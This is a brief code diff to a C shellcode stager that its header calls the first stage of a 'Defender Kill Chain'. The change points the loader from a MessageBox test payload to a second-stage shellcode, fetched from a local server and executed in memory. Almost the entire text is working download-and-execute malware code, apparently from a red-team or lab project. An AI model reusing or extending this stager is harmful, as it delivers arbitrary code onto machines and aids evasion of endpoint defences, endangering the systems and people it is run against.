@@ -20,7 +20,7 @@ Description:  This file is the first stager in our Defender Kill Chain.
 int main() {
     unsigned char* shellcode = malloc(400000);
     size_t shellcodeSize = 400000;
-    fetch_url("http://localhost:3000/MessageBoxShellcode", shellcode, &shellcodeSize);
+    fetch_url("http://localhost:3000/S2Shellcode", shellcode, &shellcodeSize);
     execute_shellcode(shellcode, shellcodeSize);
 }
 
